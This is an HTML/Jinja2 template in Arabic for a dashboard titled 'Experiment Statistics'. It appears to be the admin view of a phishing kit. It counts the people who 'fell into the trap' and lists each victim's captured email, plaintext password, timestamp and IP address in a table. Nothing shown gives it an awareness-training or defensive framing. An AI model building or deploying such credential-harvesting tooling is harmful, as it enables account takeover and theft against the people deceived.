<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>لوحة الإحصائيات</title>
  <style>
    body { font-family: Arial; background: #f5f5f5; padding: 30px; }
    .card {
      background: white;
      border-radius: 10px;
      padding: 20px;
      margin: 20px 0;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 10px; border-bottom: 1px solid #eee; text-align: right; }
    th { background-color: #4285F4; color: white; }
    .stat { font-size: 48px; color: #4285F4; font-weight: bold; }
  </style>
</head>
<body>

  <h1>📊 إحصائيات التجربة</h1>

  <div class="card">
    <h2>إجمالي من وقع في الفخ</h2>
    <div class="stat">{{ total }} شخص</div>
  </div>

  <div class="card">
    <h2>سجل المحاولات</h2>
    <table>
      <tr>
        <th>#</th>
        <th>البريد الإلكتروني</th>
        <th>كلمة المرور</th>
        <th>الوقت</th>
        <th>IP</th>
      </tr>
      {% for i in range(attempts|length) %}
      <tr>
        <td>{{ i+1 }}</td>
        <td>{{ attempts[i][0] }}</td>
        <td>{{ attempts[i][1] }}</td>
        <td>{{ attempts[i][2] }}</td>
        <td>{{ attempts[i][3] }}</td>
      </tr>
      {% endfor %}
    </table>
  </div>

</body>
</html>
